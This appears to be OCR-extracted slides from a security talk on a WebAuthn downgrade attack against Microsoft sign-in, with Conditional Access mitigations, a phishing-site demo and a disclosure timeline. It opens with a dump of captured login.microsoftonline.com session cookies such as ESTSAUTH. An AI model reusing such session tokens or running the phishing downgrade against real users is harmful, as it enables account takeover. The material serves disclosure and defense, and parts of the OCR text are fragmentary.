[{"path":"/","domain":"login.microsoftonline.com","expirationDate":1724669698,"value":"0.AXsAOT154DkJbUmxKRmO3ZFv61tEZUfGMrBJg-Ydk3ZSdsp7AIg.AgABAAQAAAAtyolDObpQQ5VtlI4uGjEPAgDs_wUA9P_h6JR1Zwjcsim7frEtKVZoeUJatcw2h_iU7Xb3m2w9BX2uN5J3V311xVaxtTVtNpfzOrdLduisqyDirTK20PsUF05mN4HbkXrDCTDLEJ0UFj-AAVo5WO0nccF6p05WzqDtonZIjpfl69b6hTLwBGmhzTynHwRQicUJeYxwudX7Ttje4IL-yOgkPKznpohiPVY5bkZXGycHf_4S1oZcx26pR1DcW8a1x0tVbpQmVD7Y8Gy3DpJ5jl7YdtDLdkl0iw_R4KyuoW39R_f4dDn5VEZz6cs06pbfExZEomHJtkUaoRWvRz03KWqsNo370bw6jZBdp6zbbzIXeioRA0v-r03KZqJkRod24XC7TCTFDmo0WAaEC0Mwp5KBAMaSbZzjtWakZ0z7c4-vPTMdcuQ_vRJZruzwgUOOLkiAkNPpuj4q4ovEJwf8smUEuneFG9l-WpchrQH1MCd_c4sp7Cqx-uCpAVu9EkXbecs8gnGgrx8ddlMZ0xk2M3liD50kaTG93eGzysoWVXCiBmTR7NNj98QUk1JU8-j_gTWoLK3VuhxZTv-eGCFiuRnSCL4GR7JRyoNhmcnygWByokLT2RnWhImm4kMSzqy_eAhCW_tpLMjc78jAy0ijYzyYRbPIuTCEBA34sYbumS4bTM8QH98ZrGGV6mbuDv9Hzdg5","name":"ESTSAUTH","httpOnly":true},{"path":"/","domain":"login.microsoftonline.com","expirationDate":1724669698,"value":"0.AXsAOT154DkJbUmxKRmO3ZFv61tEZUfGMrBJg-Ydk3ZSdsp7AIg.AgABAAQAAAAtyolDObpQQ5VtlI4uGjEPAgDs_wUA9P8snpuo6EYwJAxUjjzePCWcFJIKgqxMbEpBpguKt5LCZuAVcc3QZPEAKu_8KgVRN5-iUq7c434FiN89ebyabaJj6Lnv1cD8EQgI_J2vXbWN-n7sIaMuh5wC1Lk60lFP9ypg4kqNoPcVTRsm6AjB8HCqqeyH6LZE3SgBJjf2jGaZhUEvSpFBHGJdH4DR_nULHjhidmnc0uN7kN0WcHq6h1P83F2CUNIWBiqlt0kv2hxD4JitEsZ16lq3qC3QWgzsZztZ2O2a0oe4EV-yg7xo9lsN2Ym0Q6aLlz_IsdI9Jr2M-RmOPw0GT3eslTIkR4X2rCTi0cfPQ4KjZCjWcUh0bv7RT5WXth2QEefvefpR6tAcVrUYRUGnAL6_4Grtub9QAnbaETm213UckGjmVYmnpGuOowDmc4PhtPKtIObd-md4IR09bQ5XA_HHHwUXIilKf9Sot4zww93GsecV3ETbRg","name":"ESTSAUTHPERSISTENT","httpOnly":true},{"path":"/","domain":"login.microsoftonline.com","expirationDate":1724669698,"value":"CAgABAAIAAAAtyolDObpQQ5VtlI4uGjEPAgDs_wUA9P_xPbSyILVcPHh_65bB-rk4d8_3QcBDS0_lB6Ncf0bnHal_59sEWi-UVguTBS19CUElQRPrag7PGmvir-a8wehGtCA0OHfsbNhvNNDbQ590J84nVXYoGCJinZEF-YAm9ywdAN6LAcD99G_ArVohT6LsYeYOyl4CdzttTtvZvm-hqEUi9J4YocBmPEfpBQhYYQVUHxo7ycfY-rbIth5sKPoJvozAhwm7ujMB-HorniFHh28NwAfNbiT_zarYcQBARKxu","name":"SignInStateCookie","httpOnly":true},{"path":"/","domain":"login.microsoftonline.com","expirationDate":1724669698,"value":"PAQABAAEAAAAtyolDObpQQ5VtlI4uGjEPAgDtQFYe6zpdiJpbWZFnWf07mr_ZzllCJzXpJ91pcXAfV1m4TDZJa9EgpxjUmvhGXkU5oRqVq-sVhY6aQVxYMpye2j4jbVuVYGkuGkXSWCcBDoKQ01lrTlYalBb1f7dxBDUaqWGdlecjehkZK0PnWfN51ImsRdWqAnaMDVM6DWUs-lFiPn4gZSfS7kBGIwRt01yWO2bFyIKrXLBLVl7vP3xap40zhYQZ9tvdOSHnDHuQkgAA","name":"esctx","httpOnly":true},{"path":"/","domain":"login.microsoftonline.com","expirationDate":1724669698,"value":"+6669bd20-ee04-4117-90c5-dc7e4f7168e1","name":"ESTSAUTHLIGHT","hostOnly":true},{"path":"/","domain":"login.microsoftonline.com","expirationDate":1724669698,"value":"estsfd","name":"stsservicecookie","httpOnly":true,"hostOnly":true},{"path":"/","domain":"login.microsoftonline.com","expirationDate":1724669698,"value":"estsfd","name":"x-ms-gateway-slice","httpOnly":true,"hostOnly":true}]
```

## Slide 116

MITIGATION STRATEGIES

## Slide 117

## MITIGATION STRATEGIES

### Authentication Strength


> Recovered by OCR — confidence 89/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MITIGATION STRATEGIES
Grant
Authentication Strength
Control access enforcement to block or (4 it
grant access. Learn more &
) Block access
(@) Grant access
| Require multifactor
authentication
| Require authentication
strength
| | Require device to be marked
as compliant
```

## Slide 118

## MITIGATION STRATEGIES

### Authentication Strength


> Recovered by OCR — confidence 95/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MITIGATION STRATEGIES
Authentication Strength
such as Microsoft Authenticator
Phishing-resistant MFA
Phishing-resistan
```

## Slide 119

## MITIGATION STRATEGIES

### Authentication Strength


> Recovered by OCR — confidence 75/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MITIGATION STRATEGIES
Ol ifactor authentication : 2
Phishing-resistant MFA
i methods for the stronage
```

## Slide 120

## MITIGATION STRATEGIES

Phishing-resistant Conditional Access Policy

## Slide 121

## MITIGATION STRATEGIES

Phishing-resistant Conditional Access Policy

###### **Target resources**

###### **Grant access**


> Recovered by OCR — confidence 95/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MITIGATION STRATEGIES
Phishing-resistant Conditional Access Policy
Target resources Grant access
Select what this policy applies to
Require authentication
strength
Cloud apps
Phishing-resistant MFA
Include Exclude
```

## Slide 122

MITIGATION STRATEGIES Register Security Information Conditional Access Policy

## Slide 123

## MITIGATION STRATEGIES Register Security Information Conditional Access Policy

###### **Target resources**

**Grant access**


> Recovered by OCR — confidence 95/100 on the text kept, 95/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MITIGATION STRATEGIES
Register Security Information Conditional
Access Policy
Target resources Grant access
Select the action this policy will apply to
Register security information
[_] Register or join devices
```

## Slide 124

## MITIGATION STRATEGIES

Enforce MFA for all Users

## Slide 125

## MITIGATION STRATEGIES

Enforce MFA for all Users


> Recovered by OCR — confidence 96/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
MITIGATION STRATEGIES
Enforce MFA for all Users
Select what this policy applies to
Cloud apps
Require authentication
strength
Include Exclude
```

## Slide 126

## MITIGATION STRATEGIES

Deploying to production without
testing

## Slide 127

DEMONSTRATION

## Slide 128

DEMONSTRATION - PHISHING SITE


> Recovered by OCR — confidence 93/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMONSTRATION - PHISHING SITE
Microsoft Azure
BE Microsoft
Sign in
to continue to Micraso
No account?
Sign in with GitHub
Sign-in options
```

## Slide 129

DEMONSTRATION - PHISHING SITE


> Recovered by OCR — confidence 90/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMONSTRATION - PHISHING SITE
Microsoft Azure
BE Microsoft
© yehudasmirnov@company.com
Enter password
Forgot my p ord
Use your face, fingerprint, PIN, or security key instead
```

## Slide 130

DEMONSTRATION - PHISHING SITE


> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
DEMONSTRATION - PHISHING SITE
Microsoft Azure
Microsoft
yehuda.smirne npany.com
Verify your identity
ce Face, fingerprint, PIN or security key
Cancel
```

## Slide 131

## REPORT TIMELINE

- **10 September 2023 — Reported to Microsoft**

- • **06 November 2023 — Fixed according to Microsoft**

## Slide 132

**TAKE AWAYS**

## Slide 133

## **TAKE AWAYS**

#### Windows Hello for Business

## Slide 134

## **TAKE AWAYS**

Windows Hello for Business

#### WebAuthn API

## Slide 135

## **TAKE AWAYS**

Windows Hello for Business

#### WebAuthn API

Downgrade attack vector

## Slide 136

## **TAKE AWAYS**

Windows Hello for Business

#### WebAuthn API

Downgrade attack vector

Conditional Access Policies

## Slide 137

## **SLIDES**

#### **Github Repo with Slides**

## Slide 138

QUESTIONS?

## Slide 139

# THANK YOU

F O R W A T C H I N G

Yehuda Smirnov @yudasm_
